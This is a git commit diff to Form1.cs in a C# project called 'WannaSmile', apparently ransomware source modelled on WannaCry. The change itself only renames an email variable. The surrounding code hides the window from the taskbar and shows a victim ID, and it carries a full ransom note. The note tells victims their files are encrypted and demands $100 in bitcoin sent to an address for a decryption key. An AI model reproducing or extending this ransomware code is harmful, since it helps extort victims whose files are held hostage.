2e035c83e13a7d3ae87d24d29b95e6b363c3ce5d
siriusmd99 <siriusmd99@gmail.com>
2021-03-19 14:27:20 +0200

    Update Form1.cs

--- WannaSmile/WannaSmile/Form1.cs
+++ WannaSmile/WannaSmile/Form1.cs
@@ -16,7 +16,7 @@ namespace WannaSmile
         private void Form1_Load(object sender, EventArgs e)
         {
             ShowInTaskbar = false;
-            textBox1.Text = Program.szMail;
+            textBox1.Text = Program.szTargetMail;
             textBox2.Text = Program.szID;
 
             webBrowser1.DocumentText = "<big><b>What Happened to My Computer?</b></big></br>Your important files are encrypted.Many of your documents, photos, videos, databases and other flies are no longer accessible because they have been encrypted. Maybe you are busy looking fora way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.</br></br><big><b>Can I Recover My Files?</b></big></br>Sure. We guarantee that you can recover all your files safely and easily. Don't try to guess the password, its a strong one and even if you try to bruteforce it you will spend more money and resources guessing it, rather then paying to us.</br>To recover your files you will need to enter a secret key in the <b>Key</b> box and press Decrypt button.</br></br><big><b>How do I get the decrypt key?</b></big></br>To get your decrypt key you must send an payment of bitcoin of 100$ worth to the bitcoin adress you see below. Also include text id in the bitcoin transaction. You can find it one the left at <b>Text ID</b> field. After you sent payment, send an email to the adress below with same textid you attached to bitcoin transaction, its very important, only the textid can proove you send the transaction. The decryption key will be send to you to the same email, if no other email is included in the mail message.<br><br> Good look and hf ;)";
